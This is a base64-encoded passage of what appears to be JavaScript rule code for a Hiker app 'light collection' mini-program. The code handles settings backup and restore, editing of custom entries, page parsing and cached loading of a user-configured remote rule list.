sZXMgPSByZXF1ZXN0KHVybCksXFxcXG4gICAgICAgICAgICAgICAgICAgIGN1c3RvbURhdGEgPSByZWFkRmlsZSgnY3VzdG9tRGF0YScpXFxcXG4gICAgICAgICAgICAgICAgd3JpdGVGaWxlKGlucHV0LCBKU09OLnN0cmluZ2lmeSh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUludGVydmFsOiB1cGRhdGVJbnRlcnZhbCxcXFxcbiAgICAgICAgICAgICAgICAgICAgbmV3V2luZG93OiBuZXdXaW5kb3csXFxcXG4gICAgICAgICAgICAgICAgICAgIHRhYkZvbGQ6IHRhYkZvbGQsXFxcXG4gICAgICAgICAgICAgICAgICAgIGRpc2FibGVDdXN0b206IGRpc2FibGVDdXN0b20sXFxcXG4gICAgICAgICAgICAgICAgICAgIGN1c3RvbURhdGE6IGN1c3RvbURhdGEsXFxcXG4gICAgICAgICAgICAgICAgICAgIHJ1bGVzOiBydWxlc1xcXFxuICAgICAgICAgICAgICAgIH0pKVxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/lt7LlpIfku73vvIzms6jmhI/oi6Xku5PlupPkuLrlrZDpobXpnaLliJnkuI3lpIfku70nXFxcXG4gICAgICAgICAgICB9LCB1cmwsIHVwZGF0ZUludGVydmFsLCBuZXdXaW5kb3csIHRhYkZvbGQsIGRpc2FibGVDdXN0b20pXFxcXG4gICAgICAgIGVsc2UgcmV0dXJuICQoJ2hpa2VyOi8vZmlsZXMvdG1wLycgKyBRSU5HX1RJVExFICsgJ19iYWNrdXAuanNvbicsICfovpPlhaXlpIfku73ot6/lvoQnKS5pbnB1dCgodXJsKSA9PiB7XFxcXG4gICAgICAgICAgICBsZXQgeyB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tLCBjdXN0b21EYXRhLCBydWxlcyB9ID0gSlNPTi5wYXJzZShyZXF1ZXN0KGlucHV0KSlcXFxcbiAgICAgICAgICAgIHNhdmVGaWxlKCd1cGRhdGVJbnRlcnZhbCcsIHVwZGF0ZUludGVydmFsKVxcXFxuICAgICAgICAgICAgc2F2ZUZpbGUoJ25ld1dpbmRvdycsIG5ld1dpbmRvdylcXFxcbiAgICAgICAgICAgIHNhdmVGaWxlKCd0YWJGb2xkJywgdGFiRm9sZClcXFxcbiAgICAgICAgICAgIHNhdmVGaWxlKCdkaXNhYmxlQ3VzdG9tJywgZGlzYWJsZUN1c3RvbSlcXFxcbiAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgY3VzdG9tRGF0YSlcXFxcbiAgICAgICAgICAgIGlmIChydWxlcykgd3JpdGVGaWxlKHVybCwgcnVsZXMpXFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpXFxcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bey5oGi5aSN77yM5aaC5p6c5LiN5oOz5ZCM5q2l6L+c56iL5LuT5bqT77yM5Y+v5Lul6K6+572u5pu05paw6aKR546H5Li65omL5YqoJ1xcXFxuICAgICAgICB9LCB1cmwpXFxcXG4gICAgfSwgUUlOR19USVRMRSwgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSksXFxcXG4gICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcXFxufSwge1xcXFxuICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPGZvbnQgY29sb3I9XFxcXFxcXCIjNjY2NjY2XFxcXFxcXCI+PHNtYWxsPueJueWIq+m4o+iwou+8jOWwj+eoi+W6j+aPkOS+m+iAhe+8mlxcXFxcXFxcbicgK1xcXFxuICAgICAgICBkYXRhLnJlZHVjZSgoc2VsZiwgdikgPT4gdi5hdXRob3IgPyBzZWxmLmNvbmNhdCh2LmF1dGhvci5zcGxpdCgnJicpKSA6IHNlbGYsIFtdKVxcXFxuICAgICAgICAuZmlsdGVyKCh2LCBpLCBhcnIpID0+IHYgJiYgYXJyLmluZGV4T2YodikgPT0gaSkuam9pbign44CBJyksXFxcXG4gICAgdXJsOiAnaGlrZXI6Ly9lbXB0eScsXFxcXG4gICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcXFxufSlcXFxcblxcXFxuZWwucHVzaCh7IGNvbF90eXBlOiAnbGluZScgfSwge1xcXFxuICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArICfwn5OdJy5zbWFsbCgpICsgJyZuYnNwIOi9u+WQiOmbhuiHquWumuS5iSAmbmJzcCcuYm9sZCgpLmZvbnRjb2xvcignIzc1NzU3NScpICsgKGRpc2FibGVDdXN0b20gPyAn4p2MJyA6ICfirZUnKS5zbWFsbCgpLFxcXFxuICAgIHVybDogJChbKGRpc2FibGVDdXN0b20gPyAn5ZCv55SoJyA6ICfnpoHnlKgnKSArICflkIjpm4boh6rlrprkuYknLCAn5riF6Zmk6Ieq5a6a5LmJ5pWw5o2uJywgJ+e8lui+kUpTT04nXSwgMSkuc2VsZWN0KCgpID0+IHtcXFxcbiAgICAgICAgc3dpdGNoIChpbnB1dC5zbGljZSgwLCAyKSkge1xcXFxuICAgICAgICAgICAgY2FzZSAn5riF6ZmkJzpcXFxcbiAgICAgICAgICAgICAgICBkZWxldGVGaWxlKCdjdXN0b21EYXRhJylcXFxcbiAgICAgICAgICAgICAgICBicmVha1xcXFxuICAgICAgICAgICAgY2FzZSAn5ZCv55SoJzpcXFxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZSgnZGlzYWJsZUN1c3RvbScsICcnKVxcXFxuICAgICAgICAgICAgICAgIGJyZWFrXFxcXG4gICAgICAgICAgICBjYXNlICfnpoHnlKgnOlxcXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdkaXNhYmxlQ3VzdG9tJywgJ1QnKVxcXFxuICAgICAgICAgICAgICAgIGlucHV0ICs9ICdcXFxcXFxcXG7lsI/nqIvluo/lkK/nlKgv56aB55So44CB6YeN5paw5o6S5bqP562J5pON5L2c5Z2H5LiN5Lya5L2T546w5Zyo6aaW6aG15bCP56iL5bqP5YiX6KGo5LitJ1xcXFxuICAgICAgICAgICAgICAgIGJyZWFrXFxcXG4gICAgICAgICAgICBjYXNlICfnvJbovpEnOlxcXFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXFxcbiAgICAgICAgICAgICAgICBpZiAoIXVybC5zdGFydHNXaXRoKCdoaWtlcjovL2ZpbGVzLycpICYmICF1cmwuc3RhcnRzV2l0aCgnZmlsZTovLycpKVxcXFxuICAgICAgICAgICAgICAgICAgICB1cmwgPSAnaGlrZXI6Ly9maWxlcy9saWJzLycgKyBtZDUodXJsKSArICcuanMnXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICAnaGlrZXI6Ly9wYWdlL2ludGVyZmFjZSNub1JlZnJlc2gjI25vSGlzdG9yeSMjbm9SZWNvcmRIaXN0b3J5Iz9ydWxlPUpTT07nvJbovpHlmagmSnNvbj0nK2Jhc2U2NEVuY29kZSh1cmwpXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpXFxcXG4gICAgICAgIHJldHVybiAndG9hc3Q6Ly/lt7InICsgaW5wdXRcXFxcbiAgICB9KSxcXFxcbiAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcXFxuICAgIGV4dHJhOiB7IGxpbmVWaXNpYmxlOiBmYWxzZSB9XFxcXG59KTtcXFxcbihkaXNhYmxlQ3VzdG9tID8gWyflr7zlhaXmtbfpmJQnXSA6IFsn5ZCv55SoL+emgeeUqCcsICfph43mlrDmjpLluo8nLCAn5pu05pS55Zu+5qCHJywgJ+WvvOWFpea1t+mYlCddKS5mb3JFYWNoKCh2KSA9PiB7XFxcXG4gICAgZWwucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiB2ID09IGVkaXRNb2RlID8gJ+KAnOKAnOKAneKAnScgKyB2LmJvbGQoKS5mb250Y29sb3IoJyMxMmI2NjgnKSA6IHYsXFxcXG4gICAgICAgIHVybDogdiA9PSBlZGl0TW9kZSA/ICdoaWtlcjovL2VtcHR5JyA6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHYpID0+IHtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKCdlZGl0TW9kZScsIHYpXFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXFxcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICAgICAgfSwgdiksXFxcXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXFxcbiAgICB9KVxcXFxufSk7XFxcXG5pZiAoZWRpdE1vZGUgPT0gJ+WvvOWFpea1t+mYlCcpIGVsLnB1c2goe1xcXFxuICAgIHRpdGxlOiAn5YWo6YOo5a+85YWlJyxcXFxcbiAgICB1cmw6ICfmtbfpmJTop4bnlYzvv6Vob21lX3J1bGVfdXJs77+lJyArICh1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly8nKSB8fCB1cmwuc3RhcnRzV2l0aCgnZmlsZTovLycpID8gdXJsIDogJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJyksXFxcXG4gICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXFxcbiAgICBleHRyYTogeyBsaW5lVmlzaWJsZTogZmFsc2UgfVxcXFxufSk7XFxcXG4oZGlzYWJsZUN1c3RvbSA/IGRhdGEgOiBKU09OLnBhcnNlKHJlYWRGaWxlKCdjdXN0b21EYXRhJykgfHwgJ1tdJykpLmZvckVhY2goKHYsIGkpID0+IHtcXFxcbiAgICBsZXQgZCA9IHsgdGl0bGU6IHYudGl0bGUsIGltZzogZGF0YVtpXS5pY29uIH1cXFxcbiAgICBzd2l0Y2ggKGVkaXRNb2RlKSB7XFxcXG4gICAgICAgIGNhc2UgJ+WQr+eUqC/npoHnlKgnOlxcXFxuICAgICAgICAgICAgZC50aXRsZSA9ICh2LnZpc2libGUgPyAn8J+foiAgJyA6ICfwn5S0ICAnKSArIGQudGl0bGVcXFxcbiAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcXFxuICAgICAgICAgICAgICAgIHJ1bGVzW2ldLnZpc2libGUgPSAhcnVsZXNbaV0udmlzaWJsZVxcXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICAgICAgICAgIH0sIGkpXFxcXG4gICAgICAgICAgICBicmVha1xcXFxuICAgICAgICBjYXNlICfph43mlrDmjpLluo8nOlxcXFxuICAgICAgICAgICAgbGV0IHNvcnRGbGFnID0gcGFyc2VJbnQoZ2V0TXlWYXIoJ3NvcnRGbGFnJywgJy0xJykpXFxcXG4gICAgICAgICAgICBkLnRpdGxlID0gKHNvcnRGbGFnID09IGkgPyAn8J+UgyAgJyA6ICcnKSArIGQudGl0bGVcXFxcbiAgICAgICAgICAgIGlmIChzb3J0RmxhZyA9PSAtMSlcXFxcbiAgICAgICAgICAgICAgICBkLnVybCA9ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGkpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ3NvcnRGbGFnJywgaS50b1N0cmluZygpKVxcXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+mAieaLqeimgeenu+WKqOWIsOeahOS9jee9ridcXFxcbiAgICAgICAgICAgICAgICB9LCBpKVxcXFxuICAgICAgICAgICAgZWxzZVxcXFxuICAgICAgICAgICAgICAgIGQudXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgob2xkSW5kZXgsIG5ld0luZGV4KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcXFxuICAgICAgICAgICAgICAgICAgICBydWxlcy5zcGxpY2UobmV3SW5kZXgsIDAsIHJ1bGVzLnNwbGljZShvbGRJbmRleCwgMSlbMF0pXFxcXG4gICAgICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcignc29ydEZsYWcnLCAnLTEnKVxcXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcXFxuICAgICAgICAgICAgICAgIH0sIHNvcnRGbGFnLCBpKVxcXFxuICAgICAgICAgICAgYnJlYWtcXFxcbiAgICAgICAgY2FzZSAn5pu05pS55Zu+5qCHJzpcXFxcbiAgICAgICAgICAgIGQudXJsID0gJCh2Lmljb24gfHwgJycsICfovpPlhaXmlrDlm77moIflnLDlnYDmiJbpopzoibLku6PnoIHvvJonKS5pbnB1dCgoaSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IEpTT04ucGFyc2UocmVhZEZpbGUoJ2N1c3RvbURhdGEnKSB8fCAnW10nKVxcXFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dClcXFxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXNbaV0uaWNvbiA9IGlucHV0XFxcXG4gICAgICAgICAgICAgICAgZWxzZVxcXFxuICAgICAgICAgICAgICAgICAgICBkZWxldGUgcnVsZXNbaV0uaWNvblxcXFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgSlNPTi5zdHJpbmdpZnkocnVsZXMpKVxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXFxcbiAgICAgICAgICAgIH0sIGkpXFxcXG4gICAgICAgICAgICBicmVha1xcXFxuICAgICAgICBjYXNlICflr7zlhaXmtbfpmJQnOlxcXFxuICAgICAgICAgICAgZC51cmwgPSAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChpKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGRhdGEgPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9kYXRhTG9hZD9ydWxlPScgKyBnZXRNeVZhcignbXlDb2xsZWN0aW9uJyksIHRydWUpXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdydWxlOi8vJyArIGJhc2U2NEVuY29kZShKU09OLnN0cmluZ2lmeShkYXRhW2ldKSlcXFxcbiAgICAgICAgICAgIH0sIGkpXFxcXG4gICAgICAgICAgICBicmVha1xcXFxuICAgIH1cXFxcbiAgICBlbC5wdXNoKGQpXFxcXG59KVxcXFxuc2V0UmVzdWx0KGVsKVxcXFxuXFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6aG16Z2i6L295YWlXFxcIixcXFwicGF0aFxcXCI6XFxcImZyYW1lTG9hZFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmNvbnN0IFFJTkdfVElUTEUgPSBnZXRNeVZhcignbXlDb2xsZWN0aW9uJylcXFxcbnZhciBteUNvbGxfZWwgPSBbXVxcXFxuZXZhbChKU09OLnBhcnNlKGZldGNoKCdoaWtlcjovL3BhZ2UvaGlqYWNrRW52P3J1bGU9JyArIFFJTkdfVElUTEUpKS5ydWxlKVxcXFxuXFxcXG5pZiAoIWlzSW5kZXgpIHtcXFxcbiAgICBpZiAocGFnZVRpdGxlKSBzZXRQYWdlVGl0bGUocGFnZVRpdGxlKVxcXFxuICAgIHNldExhc3RDaGFwdGVyUnVsZShvcmlSVUxFLmxhc3RfY2hhcHRlcl9ydWxlKVxcXFxuICAgIE1ZX1BBUkFNUyA9IE1ZX1JVTEUucGFyYW1zXFxcXG59IGVsc2UgaWYgKE1ZX1BBR0UgPT0gMSkge1xcXFxuICAgIHRhYkhlYWRlci5sb2FkKG15Q29sbF9lbClcXFxcbiAgICBpZiAoUlVMRS5zZWFyY2hfdXJsKSBteUNvbGxfZWwucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuaQnOe0olxcXFxcXFwiLFxcXFxuICAgICAgICBkZXNjOiBcXFxcXFxcIui/meaYr+i9u+WQiOmbhueahOaQnOe0ouWTpn5+XFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogJ1xcXFxcXFwiaGlrZXI6Ly9zZWFyY2g/cz1cXFxcXFxcIitpbnB1dCcsXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICBydWxlczogJC50b1N0cmluZygoUUlOR19USVRMRSwgdGl0bGUpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9kYXRhTG9hZD9ydWxlPScgKyBRSU5HX1RJVExFKVxcXFxuICAgICAgICAgICAgICAgIHJ1bGVzID0gW3J1bGVzLmZpbmQoKHYpID0+IHYudGl0bGUgPT0gdGl0bGUpXVxcXFxuICAgICAgICAgICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShydWxlcylcXFxcbiAgICAgICAgICAgIH0sIFFJTkdfVElUTEUsIFJVTEUudGl0bGUpLFxcXFxuICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBnZXRNeVZhcignc2VhcmNoS2V5JywgJycpLFxcXFxuICAgICAgICAgICAgb25DaGFuZ2U6IFxcXFxcXFwicHV0TXlWYXIoJ3NlYXJjaEtleScsaW5wdXQpXFxcXFxcXCJcXFxcbiAgICAgICAgfSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaW5wdXRcXFxcXFxcIixcXFxcbiAgICB9KVxcXFxufVxcXFxuLy8g5q2j5paH6Kej5p6QXFxcXG52YXIge1xcXFxuICAgIHBhcmFtSGFuZGxlLFxcXFxuICAgIHJ1blByZVJ1bGUsXFxcXG4gICAgZ2VuRXhVcmwsXFxcXG4gICAgaGlqYWNrTGF6eVJ1bGVcXFxcbn0gPSAkLnJlcXVpcmUoJ2hpa2VyOi8vcGFnZS9mdW5jVG9vbHM/cnVsZT0nICsgUUlOR19USVRMRSlcXFxcbnJ1blByZVJ1bGUob3JpUlVMRS5wcmVSdWxlKVxcXFxuaWYgKE1ZX1JVTEUuZmluZF9ydWxlLnN0YXJ0c1dpdGgoJ2pzOicpKSB7XFxcXG4gICAgbGV0IHsgaGlqYWNrRWwgfSA9ICQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL2Z1bmNUb29scz9ydWxlPScgKyBRSU5HX1RJVExFKVxcXFxuICAgIHNldFJlc3VsdCA9IGZ1bmN0aW9uKHBhcmFtMCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMykge1xcXFxuICAgICAgICBwYXJhbTEgPSBDQUxMQkFDS19LRVlcXFxcbiAgICAgICAgcGFyYW0yID0gTVlfUlVMRVxcXFxuICAgICAgICBwYXJhbTMgPSBNWV9UWVBFXFxcXG4gICAgICAgIGlmIChBcnJheS5pc0FycmF5KHBhcmFtMC5kYXRhKSkgcGFyYW0wID0gcGFyYW0wLmRhdGFcXFxcbiAgICAgICAgQXJyYXkucHJvdG90eXBlLnB1c2guYXBwbHkobXlDb2xsX2VsLCBwYXJhbTAubWFwKGhpamFja0VsKSlcXFxcbiAgICAgICAgbWV0aG9kX3NldFJlc3VsdC5pbnZva2UoamF2YUNvbnRleHQsIG15Q29sbF9lbCwgcGFyYW0xLCBwYXJhbTIsIHBhcmFtMylcXFxcbiAgICB9XFxcXG4gICAgc2V0SG9tZVJlc3VsdCA9IHNldFJlc3VsdFxcXFxuICAgIHNldFNlYXJjaFJlc3VsdCA9IHNldFJlc3VsdFxcXFxuXFxcXG4gICAgZXZhbChNWV9SVUxFLmZpbmRfcnVsZS5zbGljZSgzKSlcXFxcbn0gZWxzZSB7XFxcXG4gICAgbGV0IHsgcnVuQ29kZSB9ID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZnVuY1Rvb2xzP3J1bGU9JyArIFFJTkdfVElUTEUpLFxcXFxuICAgICAgICBbXywgZmluZFJ1bGUsIGRldGFpbEZpbmRSdWxlXSA9IE1ZX1JVTEUuZmluZF9ydWxlLm1hdGNoKC9eKFtcXFxcXFxcXHNcXFxcXFxcXFNdKj8pKD86PT0+KFtcXFxcXFxcXHNcXFxcXFxcXFNdKikpPyQvKVxcXFxuICAgIGZpbmRSdWxlID0gZmluZFJ1bGUuc3BsaXQoJzsnKVxcXFxuICAgIHBhcnNlRG9tRm9yQXJyYXkoZ2V0UmVzQ29kZSgpLCBmaW5kUnVsZS5zaGlmdCgpKS5mb3JFYWNoKChkYXRhKSA9PiB7XFxcXG4gICAgICAgIGxldCBbdGl0bGUsIGltZywgZGVzYywgdXJsXSA9IGZpbmRSdWxlLm1hcCgodiwgaSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmICh2ID09ICcqJykgcmV0dXJuICcnXFxcXG4gICAgICAgICAgICAgICAgICAgIGVsc2UgdiA9IChpID09IDEgfHwgaSA9PSAzKSA/XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBwYXJzZURvbShkYXRhLCB2KSA6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBwYXJzZURvbUZvckh0bWwoZGF0YSwgdilcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKGkgIT0gMykgdiA9IHJ1bkNvZGUodilcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHZcXFxcbiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7IHJldHVybiAnJyB9XFxcXG4gICAgICAgICAgICB9KSxcXFxcbiAgICAgICAgICAgIHJlcyA9IHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsIHVybDogdXJsLFxcXFxuICAgICAgICAgICAgICAgIGRlc2M6IGRlc2MsIGltZzogaW1nLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBNWV9SVUxFLmNvbF90eXBlXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIGlmIChyZXMudXJsKSB7XFxcXG4gICAgICAgICAgICBpZiAocmVzLnVybC5pbmNsdWRlcygnQGxhenlSdWxlPScpKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJlSW5kZXggPSByZXMudXJsLmluZGV4T2YoJy5qczonKVxcXFxuICAgICAgICAgICAgICAgIGlmIChyZUluZGV4ID49IDApIHJlcy51cmwgPSByZXMudXJsLnNsaWNlKDAsIHJlSW5kZXgpICsgJy5qczonICsgaGlqYWNrTGF6eVJ1bGUgKyAnOycgKyByZXMudXJsLnNsaWNlKHJlSW5kZXggKyA0KVxcXFxuICAgICAgICAgICAgfSBlbHNlICBpZiAoZGV0YWlsRmluZFJ1bGUpIHtcXFxcbiAgICAgICAgICAgICAgICByZXMuZXh0cmEgPSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogZ2VuRXhVcmwodXJsKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgUlVMRTogYmFzZTY0RW5jb2RlKEpTT04uc3RyaW5naWZ5KE9iamVjdC5hc3NpZ24oZ2VuTXlSdWxlKCksIHsgZGV0YWlsX2ZpbmRfcnVsZTogZGV0YWlsRmluZFJ1bGUgfSkpKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgcGFnZVRpdGxlOiBpc0luZGV4ICYmIHRpdGxlXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHJlcy51cmwgPSAnaGlrZXI6Ly9wYWdlL2ZyYW1lTG9hZD9ydWxlPScgKyBRSU5HX1RJVExFXFxcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKE1ZX1JVTEUuZGV0YWlsX2ZpbmRfcnVsZSkge1xcXFxuICAgICAgICAgICAgICAgIHJlcy5leHRyYSA9IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBnZW5FeFVybCh1cmwpLFxcXFxuICAgICAgICAgICAgICAgICAgICBSVUxFOiBiYXNlNjRFbmNvZGUoSlNPTi5zdHJpbmdpZnkoZ2VuTXlSdWxlKCkpKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgcGFnZVRpdGxlOiBpc0luZGV4ICYmIHRpdGxlXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHJlcy51cmwgPSAnaGlrZXI6Ly9wYWdlL2ZyYW1lTG9hZD9ydWxlPScgKyBRSU5HX1RJVExFXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbXlDb2xsX2VsLnB1c2gocmVzKVxcXFxuICAgIH0pXFxcXG4gICAgc2V0UmVzdWx0KG15Q29sbF9lbClcXFxcbn1cXFxcblxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuaVsOaNrui9veWFpVxcXCIsXFxcInBhdGhcXFwiOlxcXCJkYXRhTG9hZFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJsZXQgc2hvd0FsbCA9ICQuaW1wb3J0UGFyYW0sXFxcXG4gICAgdXJsID0gZ2V0TXlWYXIoJ3JlbW90ZVVybCcpLFxcXFxuICAgIGRhdGEgPSBbXVxcXFxuaWYgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovLycpIHx8IHVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykpIHtcXFxcbiAgICAvLyDlpoLmnpzkuLrmnKzlnLDmlofku7bliJnkuI3ov5vooYznvJPlrZhcXFxcbiAgICB0cnkge1xcXFxuICAgICAgICBsZXQgb3JpRGF0YSA9IGZldGNoKHVybClcXFxcbiAgICAgICAgaWYgKHVybC5zdGFydHNXaXRoKCdoaWtlcjovL3BhZ2UvJykpXFxcXG4gICAgICAgICAgICBvcmlEYXRhID0gSlNPTi5wYXJzZShvcmlEYXRhKS5ydWxlXFxcXG4gICAgICAgIGRhdGEgPSBKU09OLnBhcnNlKG9yaURhdGEpXFxcXG4gICAgfSBjYXRjaCAoZSkge31cXFxcbn0gZWxzZSB7XFxcXG4gICAgLy8g6I635Y+W6L+c56iL5pWw5o2u77yM5qOA5p+l6Ze06ZqU6buY6K6k5LiA5aSpXFxcXG4gICAgbGV0IGludGVydmFsID0gcGFyc2VJbnQocmVhZEZpbGUoJ3VwZGF0ZUludGVydmFsJykgfHwgJzEnKSxcXFxcbiAgICAgICAgb2xkRGF0YSA9IGZldGNoKCdoaWtlcjovL2ZpbGVzL2xpYnMvJyArIG1kNSh1cmwpICsgJy5qcycpLFxcXFxuICAgICAgICByZW1vdGVEYXRhID0gW11cXFxcbiAgICBpZiAoaW50ZXJ2YWwgPT0gMCkgaW50ZXJ2YWwgPSAtMVxcXFxuICAgIHRyeSB7IHJlbW90ZURhdGEgPSBKU09OLnBhcnNlKGZldGNoQ2FjaGUodXJsLCAyNCAqIGludGVydmFsLCB7IHRpbWVvdXQ6IDUwMDAwIH0pKSB9IGNhdGNoIChlKSB7fVxcXFxuICAgIGlmICghQXJyYXkuaXNBcnJheShyZW1vdGVEYXRhKSkgcmVtb3RlRGF0YSA9IFtdXFxcXG4gICAgaWYgKHJlbW90ZURhdGEubGVuZ3RoIDwgMykge1xcXFxuICAgICAgICBsb2coJ+acquiOt+WPluWIsOaVsOaNricpXFxcXG4gICAgICAgIGlmIChvbGREYXRhKSB3cml0ZUZpbGUoJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJywgb2xkRGF0YSlcXFxcbiAgICAgICAgZGF0YSA9IEpTT04ucGFyc2Uob2xkRGF0YSB8fCAnW10nKVxcXFxuICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIGxvZygn5bey6I635Y+W5Yiw5pWw5o2uJylcXFxcbiAgICAgICAgZGF0YSA9IHJlbW90ZURhdGFcXFxcbiAgICB9XFxcXG59XFxcXG5kYXRhID0gZGF0YS5maWx0ZXIoKHYpID0+IHYudGl0bGUgIT0gZ2V0TXlWYXIoJ215Q29sbGVjdGlvbicpICYmICEodi5hdXRob3IgfHwgJycpLmluY2x1ZGVzKCfovbvlkIjpm4bnlJ/miJDlmagnKSlcXFxcbmlmIChyZWFkRmlsZSgnZGlzYWJsZUN1c3RvbScpKSAkLmV4cG9ydHMgPSBkYXRhXFxcXG5lbHNlIHsgLy8g5YaZ5YWl6Ieq5a6a5LmJ5pWw5o2uXFxcXG4gICAgbGV0IGN1c3RvbURhdGEgPSBKU09OL